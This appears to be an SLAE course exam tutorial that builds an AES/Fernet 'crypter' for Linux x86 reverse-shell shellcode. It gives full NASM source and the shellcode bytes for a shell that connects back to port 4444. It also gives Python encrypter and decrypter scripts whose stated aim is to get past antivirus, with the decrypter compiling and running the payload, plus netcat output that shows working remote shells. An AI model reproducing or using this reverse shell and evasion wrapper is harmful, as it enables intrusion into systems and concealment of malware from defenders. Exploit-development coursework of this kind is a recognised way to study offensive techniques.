# Custom AES 128 bit Crypter

<p style="text-align: justify;">Today we'll write a simple Crypter and Decrypter in Python using the Fernet library.</p>

<p style="text-align: justify;">Our Crypter will be based on the following components:</p>
- AES in CBC mode with a 128-bit key for encryption; using PKCS7 padding.
- HMAC using SHA256 for authentication.
- Initialization vectors are generated using os.urandom().
- The password will be static, but in every non-test consideration it should never be placed inside the file, but received from the user

### Shellcode

<p style="text-align: justify;">We'll use Crypter against shellcode from Assignment No. 2, which means reverse shell. These operations are carried out in order to deceive or bypass anti-virus software or other security systems.</p>

To start with, here is our shellcode in NASM:
```nasm
; Filename: reverse_shell.nasm
; Author:   Jakub Heba
; Purpose:  SLAE Course & Exam

global _start			

; Header Files:
; -------------------------------------------------------------------------------------------------------
; |  Linux Syscall description file path: 		|  /usr/include/i386-linux-gnu/asm/unistd_32.h  |
; |  Linux Socketcall numbers:				|  /usr/include/linux/net.h			|
; |  Linux IP Protocols Declarations:			|  /usr/include/netinet/in.h			|
; |  Linux System-specific socket constants and types:	|  /usr/include/i386-linux-gnu/bits/socket.h	|
; -------------------------------------------------------------------------------------------------------

section .text
_start:

cleaning:
	; cleaning all registers for further usage
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx
sys_socket:	
	mov al, 102 		; syscall - socketcall
	mov bl, 1		; socketcall type - sys_socket
	xor esi, esi		
	push esi		; IPPROTO_IP = 0 (null)
	push 1			; SOCK_STREAM = 1
	push 2			; AF_INET = 2 (PF_INET)
	mov ecx, esp 		; directing the stack pointer to sys_socket() function arguments
	int 128			; syscall execution
	mov edx, eax		; saving the reverse_socket pointer for further usage
sys_connect:
	mov al, 102		; syscall - socketcall
	mov bl, 3		; socketcall type - sys_connect
	push esi		; pushing 0 (null)
	mov ecx, 0x06050584	; moving the 127.0.0.1 address into ECX (reverse order, becouse of nulls, we have to add value 5 in every place...
	sub ecx, 0x05050505	; ... and then substract value 5 from every place
	push ecx		; pushing TARGET address to the stack
	push word 0x5c11	; PORT = 4444 (change reverse hex value for different port)
	push word 2		; AF_INET = 2
	mov ecx, esp		; directing the stack pointer to address struct arguments
	
	push 16			; socklen_t addrlen (size) = 16
	push ecx		; const struct sockaddr *addr - stack pointer with struct arguments	
	push edx		; reverse_socket pointer
	mov ecx, esp		; directing the stack pointer to sys_bind() function arguments
	int 128			; syscall execution
sys_dup2:
	mov al, 63		; syscall - dup2
	mov ebx, edx		; overwriting the reverse_socket pointer
	xor ecx, ecx		; STDIN - 0 (null)
	int 128			; syscall execution
	mov al, 63		; syscall - dup2
	mov cl, 1		; STDOUT - 1
	int 128			; syscall execution
	mov al, 63		; syscall - dup2
	mov cl, 2		; STDERR - 2
	int 128			; syscall execution
sys_execve:
	mov al, 11		; syscall - execve
	xor esi, esi
	push esi		; pushing 0 (null)

	push 0x68732f6e		; pushing "n/sh"
	push 0x69622f2f		; pushing "//bi"

	mov ebx, esp		; directing the stack pointer to sys_execve() string argument
	xor ecx, ecx		; char *const envp[] = 0 (null)
	xor edx, edx		; char *const argv[] = 0 (null)
	int 128			; syscall execution
```
<p style="text-align: justify;">We compile, link, put the result in shellcode.c wrapper and run to check how it works.</p>

```sh
$ ./compile.sh reverse-shell
[+] Assembling with Nasm ... 
[+] Linking ...
[+] Done!
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x31\xf6\x56\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc2\xb0\x66\xb3\x03\x56\xb9\x84\x05\x05\x06\x81\xe9\x05\x05\x05\x05\x51\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\x6a\x10\x51\x52\x89\xe1\xcd\x80\xb0\x3f\x89\xd3\x31\xc9\xcd\x80\xb0\x3f\xb1\x01\xcd\x80\xb0\x3f\xb1\x02\xcd\x80\xb0\x0b\x31\xf6\x56\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xcd\x80"

$ vim shellcode.c
$ gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
$ ./shellcode 
Shellcode Length:  102
```
Second terminal:
```sh
$ nc -nvlp 4444
Listening on [0.0.0.0] (family 0, port 4444)
Connection from [127.0.0.1] port 4444 [tcp/*] accepted (family 2, sport 45811)
whoami
root
```
<p style="text-align: justify;">Excellent, it works how it should. Our shellcode will therefore be:</p>

```sh
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x31\xf6\x56\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc2\xb0\x66\xb3\x03\x56\xb9\x84\x05\x05\x06\x81\xe9\x05\x05\x05\x05\x51\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\x6a\x10\x51\x52\x89\xe1\xcd\x80\xb0\x3f\x89\xd3\x31\xc9\xcd\x80\xb0\x3f\xb1\x01\xcd\x80\xb0\x3f\xb1\x02\xcd\x80\xb0\x0b\x31\xf6\x56\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xcd\x80"
```

### Encrypter

<p style="text-align: justify;">Below is the Encrypter code in Python, which I tried to explain using comments in individual sections.</p>

```python
#!/usr/bin/python3
from cryptography.fernet import Fernet
import sys
#import binascii
import base64
import os
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

# configuring variables for key generation
passwd = "SLAE"
password = passwd.encode()
salt = b'%s' % os.urandom(16)

kdf = PBKDF2HMAC(
    algorithm=hashes.SHA256(),
    length=32,
    salt=salt,
    iterations=100000,
    backend=default_backend()
)
key = base64.urlsafe_b64encode(kdf.derive(password))

# saving generated, unique key to the key.key file
file = open('key.key','wb')
file.write(key)
file.close()

# help message in case of wrong arguments count
if len(sys.argv) != 2:
    print("\nUsage: python3 crypter.py {shellcode}\n")
    print("Example:\npython3 crypter.py \"\\x31\\xc0\\xeb\\x20\\x5b\\x31\\xc0\\xeb\\x20\\x5b\\\"\n")
    quit()

print("\n/--------------------------------/")
print(" ***  Fernet AES Encrypter.  ***")
print("/--------------------------------/")

print("\n\n*** Generated key: *** \n",30*'-',"\n", key.decode("utf-8"))

# Taking shellcode from argv and encrypting using generated key
plainAscii = bytes(sys.argv[1],'ascii')
cipher = Fernet(key)
ciphAscii = cipher.encrypt(plainAscii)

print("\n*** Original Shellcode: ***\n",30*"-","\n",sys.argv[1])           
print("\n*** Data after encryption: ***\n",30*'-',"\n", ciphAscii.decode("utf-8"))

# Replacing encrypted shellcode value with hexadecimal values in python style
shell = r"\x" + r"\x".join(ciphAscii.hex()[n : n+2] for n in range(0, len(ciphAscii.hex()), 2))
print("\n*** Encrypted shellcode: ***\n",30*"-","\n",'"',shell,'"')
```
<p style="text-align: justify;">An example of use using the above shellcode.</p>

```sh
$ python3 encrypt.py "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x31\xf6\x56\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc2\xb0\x66\xb3\x03\x56\xb9\x84\x05\x05\x06\x81\xe9\x05\x05\x05\x05\x51\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\x6a\x10\x51\x52\x89\xe1\xcd\x80\xb0\x3f\x89\xd3\x31\xc9\xcd\x80\xb0\x3f\xb1\x01\xcd\x80\xb0\x3f\xb1\x02\xcd\x80\xb0\x0b\x31\xf6\x56\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xcd\x80"

/--------------------------------/
 ***  Fernet AES Encrypter.  ***
/--------------------------------/


*** Generated key: *** 
 ------------------------------ 
 tCJp16dKRFfkskbfy6kew8_fkNk4EHIfv1et8BNaxRE=

*** Original Shellcode: ***
 ------------------------------ 
 \x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x31\xf6\x56\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc2\xb0\x66\xb3\x03\x56\xb9\x84\x05\x05\x06\x81\xe9\x05\x05\x05\x05\x51\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\x6a\x10\x51\x52\x89\xe1\xcd\x80\xb0\x3f\x89\xd3\x31\xc9\xcd\x80\xb0\x3f\xb1\x01\xcd\x80\xb0\x3f\xb1\x02\xcd\x80\xb0\x0b\x31\xf6\x56\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xcd\x80

*** Data after encryption: ***
 ------------------------------ 
 gAAAAABegkiNKneSlvzZq4pLGRt8toKc9NPN8ATpolZvsGcAlgFT7RfFNR18MSWIiSz-wib6vSEiHQkZltbSRs52RCY6xlCELbxIS9X7ooBji8nve5s_CFs7lyRAPge250e7o8SNlDl064O3Cquk1QmeVqeRTGRFYOyAGGNwTYiqvIxvGL2-54Tbg8UFo50jxyAk5osGfF3H11fI_nrm_6QeQCYe7jN4XMj_5xbwe83qsGzxgI36qVpGPOGFT28yugkwq7qRR5-oP4DLBv3qYwgW55Ix6ZYHZTOOo8bvfyZZnTjLQG85wIgiFEweYAMg-BisoOXtvLfk213Cg9hEdsd5HieyUAHpv59pAZMkP9yeCoL7RXT_ierI0lxsMiF1uN_DToD5eKedmX16TWjyP6h_zTglMVUucFvsh_Ri9xAOaimnW1BoF7YHAR8pj9h5PTi-I-8OQK76Dn1vUMvLIegyX1aLEFV2lF3_2R4dBtaatpFs6Tyb_rGIWdnZoOQfBaT1b3CGK3cSqZgEMiBgGUw4jOyHLGE_tnvJTGqYiuXdIUdbfabmskgz5Xel7e1RjXqvuKLs1RrCT-lwYw1c-LHLNbwZLx2arzj9fq7bR4NgE7mp9VNd8h4=

*** Encrypted shellcode: ***
 ------------------------------ 
 " \x67\x41\x41\x41\x41\x41\x42\x65\x67\x6b\x69\x4e\x4b\x6e\x65\x53\x6c\x76\x7a\x5a\x71\x34\x70\x4c\x47\x52\x74\x38\x74\x6f\x4b\x63\x39\x4e\x50\x4e\x38\x41\x54\x70\x6f\x6c\x5a\x76\x73\x47\x63\x41\x6c\x67\x46\x54\x37\x52\x66\x46\x4e\x52\x31\x38\x4d\x53\x57\x49\x69\x53\x7a\x2d\x77\x69\x62\x36\x76\x53\x45\x69\x48\x51\x6b\x5a\x6c\x74\x62\x53\x52\x73\x35\x32\x52\x43\x59\x36\x78\x6c\x43\x45\x4c\x62\x78\x49\x53\x39\x58\x37\x6f\x6f\x42\x6a\x69\x38\x6e\x76\x65\x35\x73\x5f\x43\x46\x73\x37\x6c\x79\x52\x41\x50\x67\x65\x32\x35\x30\x65\x37\x6f\x38\x53\x4e\x6c\x44\x6c\x30\x36\x34\x4f\x33\x43\x71\x75\x6b\x31\x51\x6d\x65\x56\x71\x65\x52\x54\x47\x52\x46\x59\x4f\x79\x41\x47\x47\x4e\x77\x54\x59\x69\x71\x76\x49\x78\x76\x47\x4c\x32\x2d\x35\x34\x54\x62\x67\x38\x55\x46\x6f\x35\x30\x6a\x78\x79\x41\x6b\x35\x6f\x73\x47\x66\x46\x33\x48\x31\x31\x66\x49\x5f\x6e\x72\x6d\x5f\x36\x51\x65\x51\x43\x59\x65\x37\x6a\x4e\x34\x58\x4d\x6a\x5f\x35\x78\x62\x77\x65\x38\x33\x71\x73\x47\x7a\x78\x67\x49\x33\x36\x71\x56\x70\x47\x50\x4f\x47\x46\x54\x32\x38\x79\x75\x67\x6b\x77\x71\x37\x71\x52\x52\x35\x2d\x6f\x50\x34\x44\x4c\x42\x76\x33\x71\x59\x77\x67\x57\x35\x35\x49\x78\x36\x5a\x59\x48\x5a\x54\x4f\x4f\x6f\x38\x62\x76\x66\x79\x5a\x5a\x6e\x54\x6a\x4c\x51\x47\x38\x35\x77\x49\x67\x69\x46\x45\x77\x65\x59\x41\x4d\x67\x2d\x42\x69\x73\x6f\x4f\x58\x74\x76\x4c\x66\x6b\x32\x31\x33\x43\x67\x39\x68\x45\x64\x73\x64\x35\x48\x69\x65\x79\x55\x41\x48\x70\x76\x35\x39\x70\x41\x5a\x4d\x6b\x50\x39\x79\x65\x43\x6f\x4c\x37\x52\x58\x54\x5f\x69\x65\x72\x49\x30\x6c\x78\x73\x4d\x69\x46\x31\x75\x4e\x5f\x44\x54\x6f\x44\x35\x65\x4b\x65\x64\x6d\x58\x31\x36\x54\x57\x6a\x79\x50\x36\x68\x5f\x7a\x54\x67\x6c\x4d\x56\x55\x75\x63\x46\x76\x73\x68\x5f\x52\x69\x39\x78\x41\x4f\x61\x69\x6d\x6e\x57\x31\x42\x6f\x46\x37\x59\x48\x41\x52\x38\x70\x6a\x39\x68\x35\x50\x54\x69\x2d\x49\x2d\x38\x4f\x51\x4b\x37\x36\x44\x6e\x31\x76\x55\x4d\x76\x4c\x49\x65\x67\x79\x58\x31\x61\x4c\x45\x46\x56\x32\x6c\x46\x33\x5f\x32\x52\x34\x64\x42\x74\x61\x61\x74\x70\x46\x73\x36\x54\x79\x62\x5f\x72\x47\x49\x57\x64\x6e\x5a\x6f\x4f\x51\x66\x42\x61\x54\x31\x62\x33\x43\x47\x4b\x33\x63\x53\x71\x5a\x67\x45\x4d\x69\x42\x67\x47\x55\x77\x34\x6a\x4f\x79\x48\x4c\x47\x45\x5f\x74\x6e\x76\x4a\x54\x47\x71\x59\x69\x75\x58\x64\x49\x55\x64\x62\x66\x61\x62\x6d\x73\x6b\x67\x7a\x35\x58\x65\x6c\x37\x65\x31\x52\x6a\x58\x71\x76\x75\x4b\x4c\x73\x31\x52\x72\x43\x54\x2d\x6c\x77\x59\x77\x31\x63\x2d\x4c\x48\x4c\x4e\x62\x77\x5a\x4c\x78\x32\x61\x72\x7a\x6a\x39\x66\x71\x37\x62\x52\x34\x4e\x67\x45\x37\x6d\x70\x39\x56\x4e\x64\x38\x68\x34\x3d "
```
<p style="text-align: justify;">Verification of the key.key file, which should be created in the same directory.</p>

```sh
$ cat key.key
tCJp16dKRFfkskbfy6kew8_fkNk4EHIfv1et8BNaxRE=
```
<p style="text-align: justify;">Fantastic, it works as it should. Our shellcode in no way resembles the one we used for the encryption operation.</p>

### Decrypter

<p style="text-align: justify;">Below is the Decrypter code, written in Python, which will perform exactly the opposite operations to restore the original shellcode in case a valid key.key file is provided. Otherwise, the program will return an error indicating an invalid key.</p>

<p style="text-align: justify;">In addition, the shellcode execution functionality has been implemented, i.e. the creation of a shellcode.c file with dynamically assigned decrypted shellcode, its compilation and launch. Again, all sections are described as comments.</p>

```python
#!/usr/bin/python3
from cryptography.fernet import Fernet
import sys
import binascii
import base64
import codecs
import os
import time
import cryptography
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

# opening key.key file with should be avaliable in the same folder
file = open('key.key','rb')
key = file.read()
file.close()

if len(sys.argv) != 2:
    print("\nUsage: python3 decrypter.py {shellcode}\n")
    print("Example:\npython3 decrypter.py \"\\x31\\xc0\\xeb\\x20\\x5b\\x31\\xc0\\xeb\\x20\\x5b\\\"\n")
    quit()

print("\n/--------------------------------/")
print(" ***  Fernet AES Decrypter.  ***")
print("/--------------------------------/\n\n")

print("Loading key from key.key file, please wait ...\n\n")
print("*** Key loading completed! Content: ***\n",30*'-',"\n",key.decode("utf-8"),"\n")
print("Trying to decrypt the shellcode using key provided ...")
print("3..")
time.sleep(1)
print("2...")
time.sleep(1)
print("1...")
time.sleep(1)
try:
	# Taking encrypted shellcode from argv and decrypting using key provided in key.key file
	ciph = bytearray.fromhex(sys.argv[1].replace('\\x','')).decode()
	ciphAscii = bytes(ciph,'ascii')
	cipher = Fernet(key)
	dec = cipher.decrypt(ciphAscii)

	# replacing decrypted shellcode value with hexadecimal values in python/c style
	decrypted = str(dec)[2:-1].replace('\\\\','\\')

except cryptography.exceptions.InvalidSignature: 
	print("\nDecrypting failed! Wrong key. \n")
	quit()

except cryptography.fernet.InvalidToken:
	print("\nDecrypting failed! Wrong key. \n")
	quit()
print("\nSuccess!\n")

print("\n*** Decrypted shellcode: ***\n",30*"-","\n",decrypted,'\n',30*"-","\n")

# Execution part. Let's create a shellcode.c file template with variable containing our decrypted value in python/c style
execute = """
#include<stdio.h>
#include<string.h>

unsigned char code[] = \\
\""""+decrypted+"""\";
main()
{

	printf(\"Shellcode Length:  %d\\n\", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}"""

# creating shellcode.c file
cShellcode = open("shellcode.c","w")
cShellcode.write(execute)
cShellcode.close()

decision = input("Would i try to execute a shellcode? [Y/N]  ")
if decision.lower() == "y" or decision.lower() == "yes":
	# compilation and execution of our decrypted shellcode
	os.system("gcc -fno-stack-protector -z execstack -m32 shellcode.c -o shellcode 2>/dev/null")
	os.system("./shellcode")	
	# Pwned.
else:
	print("\nExiting then.\n")
```
<p style="text-align: justify;">Example of use with shellcode execution.</p>

```sh
$ python3 decrypt.py "\x67\x41\x41\x41\x41\x41\x42\x65\x67\x6b\x69\x4e\x4b\x6e\x65\x53\x6c\x76\x7a\x5a\x71\x34\x70\x4c\x47\x52\x74\x38\x74\x6f\x4b\x63\x39\x4e\x50\x4e\x38\x41\x54\x70\x6f\x6c\x5a\x76\x73\x47\x63\x41\x6c\x67\x46\x54\x37\x52\x66\x46\x4e\x52\x31\x38\x4d\x53\x57\x49\x69\x53\x7a\x2d\x77\x69\x62\x36\x76\x53\x45\x69\x48\x51\x6b\x5a\x6c\x74\x62\x53\x52\x73\x35\x32\x52\x43\x59\x36\x78\x6c\x43\x45\x4c\x62\x78\x49\x53\x39\x58\x37\x6f\x6f\x42\x6a\x69\x38\x6e\x76\x65\x35\x73\x5f\x43\x46\x73\x37\x6c\x79\x52\x41\x50\x67\x65\x32\x35\x30\x65\x37\x6f\x38\x53\x4e\x6c\x44\x6c\x30\x36\x34\x4f\x33\x43\x71\x75\x6b\x31\x51\x6d\x65\x56\x71\x65\x52\x54\x47\x52\x46\x59\x4f\x79\x41\x47\x47\x4e\x77\x54\x59\x69\x71\x76\x49\x78\x76\x47\x4c\x32\x2d\x35\x34\x54\x62\x67\x38\x55\x46\x6f\x35\x30\x6a\x78\x79\x41\x6b\x35\x6f\x73\x47\x66\x46\x33\x48\x31\x31\x66\x49\x5f\x6e\x72\x6d\x5f\x36\x51\x65\x51\x43\x59\x65\x37\x6a\x4e\x34\x58\x4d\x6a\x5f\x35\x78\x62\x77\x65\x38\x33\x71\x73\x47\x7a\x78\x67\x49\x33\x36\x71\x56\x70\x47\x50\x4f\x47\x46\x54\x32\x38\x79\x75\x67\x6b\x77\x71\x37\x71\x52\x52\x35\x2d\x6f\x50\x34\x44\x4c\x42\x76\x33\x71\x59\x77\x67\x57\x35\x35\x49\x78\x36\x5a\x59\x48\x5a\x54\x4f\x4f\x6f\x38\x62\x76\x66\x79\x5a\x5a\x6e\x54\x6a\x4c\x51\x47\x38\x35\x77\x49\x67\x69\x46\x45\x77\x65\x59\x41\x4d\x67\x2d\x42\x69\x73\x6f\x4f\x58\x74\x76\x4c\x66\x6b\x32\x31\x33\x43\x67\x39\x68\x45\x64\x73\x64\x35\x48\x69\x65\x79\x55\x41\x48\x70\x76\x35\x39\x70\x41\x5a\x4d\x6b\x50\x39\x79\x65\x43\x6f\x4c\x37\x52\x58\x54\x5f\x69\x65\x72\x49\x30\x6c\x78\x73\x4d\x69\x46\x31\x75\x4e\x5f\x44\x54\x6f\x44\x35\x65\x4b\x65\x64\x6d\x58\x31\x36\x54\x57\x6a\x79\x50\x36\x68\x5f\x7a\x54\x67\x6c\x4d\x56\x55\x75\x63\x46\x76\x73\x68\x5f\x52\x69\x39\x78\x41\x4f\x61\x69\x6d\x6e\x57\x31\x42\x6f\x46\x37\x59\x48\x41\x52\x38\x70\x6a\x39\x68\x35\x50\x54\x69\x2d\x49\x2d\x38\x4f\x51\x4b\x37\x36\x44\x6e\x31\x76\x55\x4d\x76\x4c\x49\x65\x67\x79\x58\x31\x61\x4c\x45\x46\x56\x32\x6c\x46\x33\x5f\x32\x52\x34\x64\x42\x74\x61\x61\x74\x70\x46\x73\x36\x54\x79\x62\x5f\x72\x47\x49\x57\x64\x6e\x5a\x6f\x4f\x51\x66\x42\x61\x54\x31\x62\x33\x43\x47\x4b\x33\x63\x53\x71\x5a\x67\x45\x4d\x69\x42\x67\x47\x55\x77\x34\x6a\x4f\x79\x48\x4c\x47\x45\x5f\x74\x6e\x76\x4a\x54\x47\x71\x59\x69\x75\x58\x64\x49\x55\x64\x62\x66\x61\x62\x6d\x73\x6b\x67\x7a\x35\x58\x65\x6c\x37\x65\x31\x52\x6a\x58\x71\x76\x75\x4b\x4c\x73\x31\x52\x72\x43\x54\x2d\x6c\x77\x59\x77\x31\x63\x2d\x4c\x48\x4c\x4e\x62\x77\x5a\x4c\x78\x32\x61\x72\x7a\x6a\x39\x66\x71\x37\x62\x52\x34\x4e\x67\x45\x37\x6d\x70\x39\x56\x4e\x64\x38\x68\x34\x3d"

/--------------------------------/
 ***  Fernet AES Decrypter.  ***
/--------------------------------/


Loading key from key.key file, please wait ...


*** Key loading completed! Content: ***
 ------------------------------ 
 tCJp16dKRFfkskbfy6kew8_fkNk4EHIfv1et8BNaxRE= 

Trying to decrypt the shellcode using key provided ...
3..
2...
1...

Success!


*** Decrypted shellcode: ***
 ------------------------------ 
 \x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x31\xf6\x56\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc2\xb0\x66\xb3\x03\x56\xb9\x84\x05\x05\x06\x81\xe9\x05\x05\x05\x05\x51\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\x6a\x10\x51\x52\x89\xe1\xcd\x80\xb0\x3f\x89\xd3\x31\xc9\xcd\x80\xb0\x3f\xb1\x01\xcd\x80\xb0\x3f\xb1\x02\xcd\x80\xb0\x0b\x31\xf6\x56\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xcd\x80 
 ------------------------------ 

Would i try to execute a shellcode? [Y/N]  y
Shellcode Length:  102

```
Second terminal:
```sh
$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 43262
uname -a
Linux kali 5.4.0-kali4-amd64 #1 SMP Debian 5.4.19-1kali1 (2020-02-17) x86_64 GNU/Linux
```

### Pwned.
